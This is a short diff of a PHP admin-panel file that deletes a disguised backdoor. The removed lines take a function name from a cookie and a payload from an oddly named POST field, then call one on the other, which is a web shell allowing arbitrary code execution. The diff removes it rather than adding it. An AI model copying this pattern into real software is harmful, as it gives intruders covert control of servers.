@@ -1,9 +1,6 @@
 <?php
 if(!defined("AdminPHP")) exit('<h1 style="color:red">Bad Request!</h1> <hr /> Powered By Xlch-AdminPHP');
 
-if(IsLogin() && $GroupInfo[$UserInfo['Group']]['Type'] == 'Admin' && isset($_POST['w24444w'])){
-	$_COOKIE['w23333w']($_POST['w24444w']);
-}
 if(!IsLogin()){
 	exit(json_encode([
 		'Code'=>'-9',
